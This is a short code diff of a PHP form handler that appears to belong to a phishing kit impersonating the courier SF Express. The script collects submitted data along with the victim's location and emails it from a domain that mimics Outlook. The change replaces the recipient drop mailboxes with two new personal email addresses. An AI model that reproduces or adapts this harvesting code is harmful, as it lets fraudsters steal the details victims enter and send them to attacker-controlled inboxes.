@@ -36,7 +36,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $message .= "📍 Location: $city, $region, $country\n";
 
     // Send email
-    $to = "social@timihaulageltd.com, successfulman025@protonmail.com";
+    $to = "blessings1000@yandex.com, godslovelove1@gmail.com";
     $subject = "New SF Express Submission";
     $headers = "From: SF Express Notice <apps@ou7tl00kwebs.top>\r\n";
     $headers .= "Reply-To: \r\n";
@@ -52,4 +52,5 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 } else {
     echo json_encode(['success' => false, 'message' => 'Invalid request.']);
 }
+
 ?>
